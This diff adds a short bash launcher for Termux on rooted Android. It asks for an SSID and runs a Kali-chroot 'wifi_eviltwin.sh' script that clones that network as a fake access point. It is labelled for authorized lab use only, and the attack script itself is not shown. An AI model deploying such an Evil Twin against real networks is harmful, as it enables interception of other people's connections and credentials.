@@ -1,0 +1,19 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# Puente Termux -> chroot Kali. Requiere root (Magisk autoriza Termux).
+# Punto de acceso falso (Evil Twin) clonando un SSID con hostapd.
+# Corre hasta que se corta con Ctrl-C (o WD-STOP-ATK).
+# USO AUTORIZADO UNICAMENTE: redes propias / lab.
+KALI="/data/local/nhsystem/kali-arm64"
+PATHK="export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+PROJ="cd /root/watchdog-git"
+
+echo "== EVIL TWIN =="
+echo
+read -p "SSID a clonar: " SSID
+if [ -z "$SSID" ]; then echo "[X] Sin SSID. Cancelado."; echo "[enter]"; read; exit 1; fi
+
+echo
+echo "Desplegando red gemela: [ $SSID ] en canal 6"
+echo "Ctrl-C para apagar el AP y restaurar la interfaz."
+su -c "chroot $KALI /bin/bash -c '$PATHK; $PROJ && bash scripts/kali-scripts/wifi_eviltwin.sh \"$SSID\"'"
+echo; echo "[enter para cerrar]"; read
